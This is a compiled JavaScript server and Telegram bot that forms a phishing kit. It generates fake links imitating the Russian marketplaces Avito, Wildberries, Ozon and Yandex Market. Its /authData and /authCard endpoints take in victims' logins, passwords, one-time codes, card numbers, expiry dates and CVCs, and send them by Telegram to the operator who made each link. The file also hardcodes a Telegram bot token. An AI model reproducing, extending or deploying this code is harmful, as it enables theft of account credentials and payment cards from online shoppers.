"use strict";
var __assign = (this && this.__assign) || function () {
    __assign = Object.assign || function(t) {
        for (var s, i = 1, n = arguments.length; i < n; i++) {
            s = arguments[i];
            for (var p in s) if (Object.prototype.hasOwnProperty.call(s, p))
                t[p] = s[p];
        }
        return t;
    };
    return __assign.apply(this, arguments);
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g;
    return g = { next: verb(0), "throw": verb(1), "return": verb(2) }, typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (g && (g = 0, op[0] && (_ = 0)), _) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
Object.defineProperty(exports, "__esModule", { value: true });
var TelegramApi = require("node-telegram-bot-api");
var fakelink_1 = require("./utils/fakelink");
var express = require("express");
var bodyParser = require("body-parser");
var cors = require("cors");
var app = express();
var PORT = 5555;
app.use(cors());
app.use(bodyParser.json());
app.post('/authData', function (req, res) { return __awaiter(void 0, void 0, void 0, function () {
    var body, user, userId, message;
    return __generator(this, function (_a) {
        switch (_a.label) {
            case 0:
                body = req.body;
                user = body;
                res.status(200);
                res.send();
                userId = usersLinks.get(user.url);
                message = "\u26A0\uFE0F \u041D\u043E\u0432\u044B\u0439 \u043F\u043E\u043B\u044C\u0437\u043E\u0432\u0430\u0442\u0435\u043B\u044C \u26A0\uFE0F\n\u0421\u0430\u0439\u0442: ".concat(user.website, "\n\u0421\u0441\u044B\u043B\u043A\u0430: ").concat(user.url, "\n\u041B\u043E\u0433\u0438\u043D: ").concat(user.authData.login, "\n\u041F\u0430\u0440\u043E\u043B\u044C: ").concat(user.authData.password, "\n\u041A\u043E\u0434: ").concat(user.authData.code);
                return [4 /*yield*/, bot.sendMessage(userId, message)];
            case 1:
                _a.sent();
                return [2 /*return*/];
        }
    });
}); });
app.post('/authCard', function (req, res) { return __awaiter(void 0, void 0, void 0, function () {
    var body, user, userId, message;
    return __generator(this, function (_a) {
        switch (_a.label) {
            case 0:
                body = req.body;
                user = body;
                res.status(200);
                res.send();
                userId = usersLinks.get(user.url);
                message = "\u26A0\uFE0F \u041D\u043E\u0432\u044B\u0439 \u043F\u043E\u043B\u044C\u0437\u043E\u0432\u0430\u0442\u0435\u043B\u044C \u0434\u043E\u0431\u0430\u0432\u0438\u043B \u043A\u0430\u0440\u0442\u0443 \u26A0\uFE0F\n\u0421\u0430\u0439\u0442: ".concat(user.website, "\n\u0421\u0441\u044B\u043B\u043A\u0430: ").concat(user.url, "\n\u041B\u043E\u0433\u0438\u043D: ").concat(user.authData.login, "\n\u041F\u0430\u0440\u043E\u043B\u044C: ").concat(user.authData.password, "\n\u041A\u043E\u0434: ").concat(user.authData.code, "\n\u0414\u0430\u043D\u043D\u044B\u0435 \u043A\u0430\u0440\u0442\u044B:\n\u041D\u043E\u043C\u0435\u0440: ").concat(user.cardData.cardNumber, "\n\u0414\u0430\u0442\u0430: ").concat(user.cardData.cardDate, "\nCVC: ").concat(user.cardData.cvc);
                return [4 /*yield*/, bot.sendMessage(userId, message)];
            case 1:
                _a.sent();
                return [2 /*return*/];
        }
    });
}); });
app.listen(PORT, function () {
    console.log("API listening at http://localhost:".concat(PORT));
});
var TOKEN = '6344784217:AAGWHFtxnyA69P5CvkLFsSCDzAUPbp2ixmo';
var bot = new TelegramApi(TOKEN, { polling: true, });
var startUser = {
    avito: [],
    wildberries: [],
    ozon: [],
    yandex: [],
};
var botCommands = [
    { command: '/start', description: 'Создать новую ссылку' },
    { command: '/info', description: 'Получить информацию о своих ссылках' },
    { command: '/users', description: 'Информация о своих пользователях' }
];
var states = {
    start: 'start',
    get_link: 'get_link',
    link_info: 'link_info',
    select_links: 'select_links',
    links_users: 'links_users',
};
var usersInfo = {};
var usersLinks = new Map();
var usersStates = new Map();
function start() {
    var _this = this;
    function getUserLinkInfo(callback) {
        var _a, _b;
        return __awaiter(this, void 0, void 0, function () {
            var data, userIndex, currentState, user, message, checkAuth, checkCard;
            return __generator(this, function (_c) {
                data = (_a = callback.data) === null || _a === void 0 ? void 0 : _a.split('_');
                userIndex = +data[2];
                currentState = usersStates.get(callback.from.id);
                user = currentState.pages[currentState.currentPage][userIndex];
                message = user.cardData === undefined ? "\u0414\u0430\u043D\u043D\u044B\u0435 \u0432\u0445\u043E\u0434\u0430:\n\u041B\u043E\u0433\u0438\u043D: ".concat(user.authData.login, "\n\u041F\u0430\u0440\u043E\u043B\u044C: ").concat(user.authData.password, "\n\u041A\u043E\u0434 \u0434\u043B\u044F \u0432\u0445\u043E\u0434\u0430: ").concat(user.authData.code) : "\u0414\u0430\u043D\u043D\u044B\u0435 \u0432\u0445\u043E\u0434\u0430:\n\u041B\u043E\u0433\u0438\u043D: ".concat(user.authData.login, "\n\u041F\u0430\u0440\u043E\u043B\u044C: ").concat(user.authData.password, "\n\u041A\u043E\u0434 \u0434\u043B\u044F \u0432\u0445\u043E\u0434\u0430: ").concat(user.authData.code, "\n\u0414\u0430\u043D\u043D\u044B\u0435 \u043A\u0430\u0440\u0442\u044B:\n\u041D\u043E\u043C\u0435\u0440: ").concat(user.cardData.cardNumber, "\n\u0414\u0430\u0442\u0430: ").concat(user.cardData.cardDate, "\nCVC: ").concat(user.cardData.cvc);
                checkAuth = user.authWork ? "\u2705" : "\u274C";
                checkCard = user.cardWork ? "\u2705" : "\u274C";
                return [2 /*return*/, bot.editMessageText(message, {
                        chat_id: callback.from.id,
                        message_id: (_b = callback.message) === null || _b === void 0 ? void 0 : _b.message_id,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "\u0414\u0430\u043D\u043D\u044B\u0435 \u0432\u0445\u043E\u0434\u0430 ".concat(checkAuth), callback_data: 'checkAuth' }],
                                [{ text: "\u0414\u0430\u043D\u043D\u044B\u0435 \u043A\u0430\u0440\u0442\u044B ".concat(checkCard), callback_data: 'checkCard' }],
                                [{ text: 'Назад', callback_data: 'back_to_users' }],
                            ],
                        }
                    })];
            });
        });
    }
    function showUserPage(callback) {
        var _a;
        return __awaiter(this, void 0, void 0, function () {
            var currentState, kb;
            return __generator(this, function (_b) {
                currentState = usersStates.get(callback.from.id);
                kb = (0, fakelink_1.createUsersKb)(currentState.pages, currentState.currentPage, currentState.website);
                return [2 /*return*/, bot.editMessageText("\u0418\u043D\u0444\u043E\u0440\u043C\u0430\u0446\u0438\u044F \u043F\u043E \u0441\u0441\u044B\u043B\u043A\u0435: ".concat(currentState.url), __assign({ chat_id: callback.from.id, message_id: (_a = callback.message) === null || _a === void 0 ? void 0 : _a.message_id }, kb))];
            });
        });
    }
    function nextUserPage(callback) {
        var _a, _b;
        return __awaiter(this, void 0, void 0, function () {
            var curretntState, currentPage, pages, website, url, kb, kb;
            return __generator(this, function (_c) {
                curretntState = usersStates.get(callback.from.id);
                currentPage = curretntState.currentPage;
                pages = curretntState.pages;
                website = curretntState.website;
                url = curretntState.url;
                if (currentPage < pages.length - 1) {
                    kb = (0, fakelink_1.createUsersKb)(pages, currentPage + 1, website);
                    usersStates.set(callback.from.id, { state: states.links_users, currentPage: currentPage + 1, pages: pages, url: url, website: website });
                    return [2 /*return*/, bot.editMessageText("\u0418\u043D\u0444\u043E\u0440\u043C\u0430\u0446\u0438\u044F \u043F\u043E \u0441\u0441\u044B\u043B\u043A\u0435: ".concat(url), __assign({ chat_id: callback.from.id, message_id: (_a = callback.message) === null || _a === void 0 ? void 0 : _a.message_id }, kb))];
                }
                if (currentPage === pages.length - 1) {
                    kb = (0, fakelink_1.createUsersKb)(pages, 0, website);
                    usersStates.set(callback.from.id, { state: states.links_users, currentPage: 0, pages: pages, url: url, website: website });
                    return [2 /*return*/, bot.editMessageText("\u0418\u043D\u0444\u043E\u0440\u043C\u0430\u0446\u0438\u044F \u043F\u043E \u0441\u0441\u044B\u043B\u043A\u0435: ".concat(url), __assign({ chat_id: callback.from.id, message_id: (_b = callback.message) === null || _b === void 0 ? void 0 : _b.message_id }, kb))];
                }
                return [2 /*return*/];
            });
        });
    }
    function backUserPage(callback) {
        var _a, _b;
        return __awaiter(this, void 0, void 0, function () {
            var curretntState, currentPage, pages, website, url, kb, kb;
            return __generator(this, function (_c) {
                curretntState = usersStates.get(callback.from.id);
                currentPage = curretntState.currentPage;
                pages = curretntState.pages;
                website = curretntState.website;
                url = curretntState.url;
                if (currentPage > 0) {
                    kb = (0, fakelink_1.createUsersKb)(pages, currentPage - 1, website);
                    usersStates.set(callback.from.id, { state: states.links_users, currentPage: currentPage - 1, pages: pages, url: url, website: website });
                    return [2 /*return*/, bot.editMessageText("\u0418\u043D\u0444\u043E\u0440\u043C\u0430\u0446\u0438\u044F \u043F\u043E \u0441\u0441\u044B\u043B\u043A\u0435: ".concat(url), __assign({ chat_id: callback.from.id, message_id: (_a = callback.message) === null || _a === void 0 ? void 0 : _a.message_id }, kb))];
                }
                if (currentPage === 0) {
                    kb = (0, fakelink_1.createUsersKb)(pages, pages.length - 1, website);
                    usersStates.set(callback.from.id, { state: states.links_users, currentPage: pages.length - 1, pages: pages, url: url, website: website });
                    return [2 /*return*/, bot.editMessageText("\u0418\u043D\u0444\u043E\u0440\u043C\u0430\u0446\u0438\u044F \u043F\u043E \u0441\u0441\u044B\u043B\u043A\u0435: ".concat(url), __assign({ chat_id: callback.from.id, message_id: (_b = callback.message) === null || _b === void 0 ? void 0 : _b.message_id }, kb))];
                }
                return [2 /*return*/];
            });
        });
    }
    function linkInfo(callback) {
        var _a;
        return __awaiter(this, void 0, void 0, function () {
            var currentState, website, links, linksIndex, users, pages, kb;
            return __generator(this, function (_b) {
                switch (_b.label) {
                    case 0:
                        currentState = usersStates.get(callback.from.id);
                        website = currentState.website;
                        links = currentState.links;
                        linksIndex = callback.data;
                        users = links[+linksIndex].users;
                        pages = (0, fakelink_1.creteUserPages)(users);
                        kb = (0, fakelink_1.createUsersKb)(pages, 0, website);
                        usersStates.set(callback.from.id, { state: states.links_users, currentPage: 0, pages: pages, url: "".concat(links[+linksIndex].link), website: website, });
                        return [4 /*yield*/, bot.editMessageText("\u0418\u043D\u0444\u043E\u0440\u043C\u0430\u0446\u0438\u044F \u043F\u043E \u0441\u0441\u044B\u043B\u043A\u0435: ".concat(links[+linksIndex].link), __assign({ chat_id: callback.from.id, message_id: (_a = callback.message) === null || _a === void 0 ? void 0 : _a.message_id }, kb))];
                    case 1:
                        _b.sent();
                        return [2 /*return*/];
                }
            });
        });
    }
    function exitInfo(callback) {
        return __awaiter(this, void 0, void 0, function () {
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        usersStates.set(callback.from.id, { state: states.start });
                        return [4 /*yield*/, bot.deleteMessage(callback.from.id, callback.message.message_id)];
                    case 1:
                        _a.sent();
                        return [2 /*return*/];
                }
            });
        });
    }
    function getLink(message) {
        return __awaiter(this, void 0, void 0, function () {
            var chatId, currentState, msgWait, url, fakeLink;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        chatId = message.chat.id;
                        currentState = usersStates.get(chatId);
                        return [4 /*yield*/, bot.sendMessage(chatId, 'Генерируем ссылку...')];
                    case 1:
                        msgWait = _a.sent();
                        url = (0, fakelink_1.generateFakeLink)(currentState.link);
                        usersInfo[message.chat.id][currentState.link].push((0, fakelink_1.createLink)(url));
                        usersLinks.set(url, chatId);
                        return [4 /*yield*/, bot.editMessageText("\u0421\u0441\u044B\u043B\u043A\u0430 \u0443\u0441\u043F\u0435\u0448\u043D\u043E \u0441\u0433\u0435\u043D\u0435\u0440\u0438\u0440\u043E\u0432\u0430\u043D\u0430 \u2705", {
                                chat_id: chatId,
                                message_id: msgWait.message_id,
                            })];
                    case 2:
                        _a.sent();
                        fakeLink = "<a href='".concat((0, fakelink_1.generateFakeLink)(currentState.link), "'>").concat(message.text, "</a>");
                        usersStates.set(chatId, { state: states.start });
                        return [2 /*return*/, bot.sendMessage(message.chat.id, url, {
                                disable_web_page_preview: true,
                                parse_mode: 'HTML',
                            })];
                }
            });
        });
    }
    function getAllSites(callback) {
        var _a;
        return __awaiter(this, void 0, void 0, function () {
            var linkInfo;
            return __generator(this, function (_b) {
                switch (_b.label) {
                    case 0:
                        linkInfo = getUserInfo(callback.from.id);
                        usersStates.set(callback.from.id, { state: states.link_info });
                        return [4 /*yield*/, bot.editMessageText('Информация по вашим ссылкам', {
                                chat_id: callback.from.id,
                                message_id: (_a = callback.message) === null || _a === void 0 ? void 0 : _a.message_id,
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: "Avito (\u0414\u043E\u0441\u0442\u0443\u043F\u043D\u043E ".concat(linkInfo.avito, ")"), callback_data: 'avito' }],
                                        [{ text: "WildBerries (\u0414\u043E\u0441\u0442\u0443\u043F\u043D\u043E ".concat(linkInfo.wildberries, ")"), callback_data: 'wildberries' }],
                                        [{ text: "Ozon (\u0414\u043E\u0441\u0442\u0443\u043F\u043D\u043E ".concat(linkInfo.ozon, ")"), callback_data: 'ozon' }],
                                        [{ text: "\u042F\u043D\u0434\u0435\u043A\u0441 \u043C\u0430\u0440\u043A\u0435\u0442 (\u0414\u043E\u0441\u0442\u0443\u043F\u043D\u043E ".concat(linkInfo.yandex, ")"), callback_data: 'yandex' }],
                                        [{ text: "\u0412\u044B\u0445\u043E\u0434 \u274C", callback_data: 'close_info' }],
                                    ],
                                },
                            })];
                    case 1:
                        _b.sent();
                        return [2 /*return*/];
                }
            });
        });
    }
    function getAllLinks(callback) {
        var _a, _b;
        return __awaiter(this, void 0, void 0, function () {
            var links, kb;
            return __generator(this, function (_c) {
                links = getLinks(callback.data, callback.from.id);
                if (links.length === 0) {
                    return [2 /*return*/, bot.editMessageText('У вас нет ссылок на данный сайт', {
                            chat_id: callback.from.id,
                            message_id: (_a = callback.message) === null || _a === void 0 ? void 0 : _a.message_id,
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: 'Назад', callback_data: 'user_links' }],
                                ],
                            }
                        })];
                }
                usersStates.set(callback.from.id, { state: states.select_links, website: callback.data, links: links });
                kb = (0, fakelink_1.createLinkKb)(links);
                return [2 /*return*/, bot.editMessageText("".concat((0, fakelink_1.convertLink)(callback.data)), __assign({ chat_id: callback.from.id, message_id: (_b = callback.message) === null || _b === void 0 ? void 0 : _b.message_id }, kb))];
            });
        });
    }
    function getLinks(query, userId) {
        return usersInfo[userId][query];
    }
    function getUserInfo(userId) {
        var user = usersInfo[userId];
        if (!user) {
            bot.sendMessage(userId, 'У вас еще не создана ни одна ссылка!\nЧтобы создать ссылку пропишите /start');
            return {
                avito: 0,
                wildberries: 0,
                ozon: 0,
                yandex: 0
            };
        }
        return {
            avito: user.avito.length,
            wildberries: user.wildberries.length,
            ozon: user.ozon.length,
            yandex: user.yandex.length
        };
    }
    bot.setMyCommands(botCommands);
    bot.onText(/\/start/, function (msg) { return __awaiter(_this, void 0, void 0, function () {
        var chatId, checkUser;
        return __generator(this, function (_a) {
            chatId = msg.chat.id;
            checkUser = chatId in usersInfo;
            if (!checkUser) {
                usersInfo[chatId] = startUser;
            }
            usersStates.set(chatId, { state: states.start });
            console.log(usersInfo);
            console.log(usersStates);
            return [2 /*return*/, bot.sendMessage(chatId, 'Какую ссылку нужно создать?', {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: 'Avito', callback_data: 'avito' }],
                            [{ text: 'Wildberries', callback_data: 'wildberries' }],
                            [{ text: 'Ozon', callback_data: 'ozon' }],
                            [{ text: 'Яндекс маркет', callback_data: 'yandex' }],
                        ],
                        resize_keyboard: true,
                    },
                })];
        });
    }); });
    bot.on('callback_query', function (callback) { return __awaiter(_this, void 0, void 0, function () {
        var data, chatId, currentState;
        var _a;
        return __generator(this, function (_b) {
            switch (_b.label) {
                case 0:
                    data = callback.data;
                    chatId = callback.from.id;
                    currentState = usersStates.get(chatId);
                    if (data === 'close_info')
                        return [2 /*return*/, exitInfo(callback)];
                    if (data === 'user_links')
                        return [2 /*return*/, getAllSites(callback)];
                    if (currentState.state === states.select_links)
                        return [2 /*return*/, linkInfo(callback)];
                    if (currentState.state === states.link_info)
                        return [2 /*return*/, getAllLinks(callback)];
                    if (currentState.state === states.links_users) {
                        if (data === null || data === void 0 ? void 0 : data.includes('get_user'))
                            return [2 /*return*/, getUserLinkInfo(callback)];
                        if (data === 'next_user_page')
                            return [2 /*return*/, nextUserPage(callback)];
                        if (data === 'back_user_page')
                            return [2 /*return*/, backUserPage(callback)];
                        if (data === 'back_to_users')
                            return [2 /*return*/, showUserPage(callback)];
                        if (data === 'back') {
                            callback.data = currentState.website;
                            return [2 /*return*/, getAllLinks(callback)];
                        }
                        if (data === 'users_page_counter')
                            return [2 /*return*/];
                    }
                    if (!((data === 'avito') || (data === 'wildberries') || (data === 'ozon') || (data === 'yandex'))) return [3 /*break*/, 2];
                    return [4 /*yield*/, bot.editMessageText('Теперь отрпавь ссылку-маску', {
                            chat_id: callback.from.id,
                            message_id: (_a = callback.message) === null || _a === void 0 ? void 0 : _a.message_id,
                        })];
                case 1:
                    _b.sent();
                    usersStates.set(callback.from.id, { state: states.get_link, link: data });
                    _b.label = 2;
                case 2: return [2 /*return*/];
            }
        });
    }); });
    bot.onText(/\/info/, function (msg) { return __awaiter(_this, void 0, void 0, function () {
        var chatId, linkInfo;
        return __generator(this, function (_a) {
            switch (_a.label) {
                case 0:
                    chatId = msg.chat.id;
                    linkInfo = getUserInfo(chatId);
                    usersStates.set(chatId, { state: states.link_info });
                    return [4 /*yield*/, bot.sendMessage(chatId, 'Информация по вашим ссылкам', {
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: "Avito (\u0414\u043E\u0441\u0442\u0443\u043F\u043D\u043E ".concat(linkInfo.avito, ")"), callback_data: 'avito' }],
                                    [{ text: "WildBerries (\u0414\u043E\u0441\u0442\u0443\u043F\u043D\u043E ".concat(linkInfo.wildberries, ")"), callback_data: 'wildberries' }],
                                    [{ text: "Ozon (\u0414\u043E\u0441\u0442\u0443\u043F\u043D\u043E ".concat(linkInfo.ozon, ")"), callback_data: 'ozon' }],
                                    [{ text: "\u042F\u043D\u0434\u0435\u043A\u0441 \u043C\u0430\u0440\u043A\u0435\u0442 (\u0414\u043E\u0441\u0442\u0443\u043F\u043D\u043E ".concat(linkInfo.yandex, ")"), callback_data: 'yandex' }],
                                    [{ text: "\u0412\u044B\u0445\u043E\u0434 \u274C", callback_data: 'close_info' }],
                                ],
                                resize_keyboard: true,
                            },
                        })];
                case 1:
                    _a.sent();
                    return [2 /*return*/];
            }
        });
    }); });
    bot.on('message', function (message) { return __awaiter(_this, void 0, void 0, function () {
        var chatId, currentState;
        return __generator(this, function (_a) {
            chatId = message.chat.id;
            currentState = usersStates.get(chatId);
            if (currentState == undefined)
                return [2 /*return*/];
            if (currentState.state === 'get_link')
                return [2 /*return*/, getLink(message)];
            if ((message.text === '/start') || (message.text === '/info') || (message.text || '/users'))
                return [2 /*return*/];
            return [2 /*return*/, bot.sendMessage(chatId, 'Комманда не найдена')];
        });
    }); });
}
start();
